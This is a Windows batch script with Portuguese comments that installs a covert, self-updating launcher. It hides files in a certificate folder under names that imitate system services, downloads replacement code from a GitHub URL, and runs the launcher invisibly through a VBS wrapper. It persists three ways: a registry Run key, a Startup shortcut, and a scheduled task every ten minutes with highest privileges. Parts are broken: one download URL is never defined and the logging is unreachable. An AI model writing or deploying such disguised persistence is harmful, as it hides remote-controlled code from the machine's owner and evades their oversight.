set "LAUNCHER_VERSION=1.1"
set "LAUNCHER_VERSION_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/launcher_version.txt"

set "secretPath=%LOCALAPPDATA%\Microsoft\SystemCertificates"
set "workerScriptPath=%secretPath%\restore_worker.bat"
set "launcherScriptPath=%secretPath%\WinLogonSvc.bat"
set "vbsLauncherPath=%secretPath%\launcher_invisible.vbs"

curl -sL "%LAUNCHER_VERSION_URL%" -o "%secretPath%\lv.tmp" --connect-timeout 30 2>nul
if exist "%secretPath%\lv.tmp" (
    set /p LATEST_VERSION=<"%secretPath%\lv.tmp"
    del /f /q "%secretPath%\lv.tmp" >nul 2>&1
    if !LAUNCHER_VERSION! LSS !LATEST_VERSION! (
        curl -sL "%LAUNCHER_SCRIPT_URL%" -o "%launcherScriptPath%.new" --connect-timeout 30 2>nul
        if exist "%launcherScriptPath%.new" (
            (echo @echo off & echo timeout /t 2 /nobreak > nul & echo move /Y "%launcherScriptPath%.new" "%launcherScriptPath%" > nul & echo del /f /q "%~f0" > nul) > "%secretPath%\ul.bat"
            start "" /B "%secretPath%\ul.bat"
            goto :eof
        )
    )
)

set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SysCertSvc.lnk"
set "targetPath=%launcherScriptPath%"

:: Cria o script VBS para rodar o launcher invisivelmente
(
    echo Set WshShell = CreateObject("WScript.Shell"^)
    echo WshShell.Run """" ^& WScript.Arguments(0) ^& """" , 0, False
) > "%vbsLauncherPath%"

:: 1. Persistência via registro HKCU
set "regKey=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "%regKey%" /v "SysCertSvc" >nul 2>&1
if %errorlevel% neq 0 (
    reg add "%regKey%" /v "SysCertSvc" /t REG_SZ /d "wscript.exe \"%vbsLauncherPath%\" \"%launcherScriptPath%\"" /f >nul
)

:: 2. Persistência via atalho na pasta Startup do usuário
set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SysCertSvc.lnk"
if not exist "%shortcutPath%" (
    powershell -Command ^
        "$ws = New-Object -ComObject WScript.Shell; ^
         $s = $ws.CreateShortcut('%shortcutPath%'); ^
         $s.TargetPath = 'wscript.exe'; ^
         $s.Arguments = '\"%vbsLauncherPath%\" \"%launcherScriptPath%\"'; ^
         $s.WindowStyle = 7; ^
         $s.Save()" >nul 2>&1
)

:: 3. Persistência via Tarefa Agendada rodando a cada 10 minutos com privilégios elevados
schtasks /query /tn "SystemCertService" >nul 2>&1
if %errorlevel% neq 0 (
    schtasks /create /tn "SystemCertService" /tr "wscript.exe \"%vbsLauncherPath%\" \"%launcherScriptPath%\"" /sc MINUTE /mo 10 /rl HIGHEST /f >nul
)

:: Inicia o worker, se existir, em background com prioridade alta
if exist "%workerScriptPath%" (
    start "" /B /high "%workerScriptPath%"
)

:eof
endlocal
exit /b




:: Logging
set "logPath=%LOCALAPPDATA%\Microsoft\SystemCertificates\WinLogonSvc.log"
echo %DATE% %TIME% - WinLogonSvc executado. >> "%logPath%"

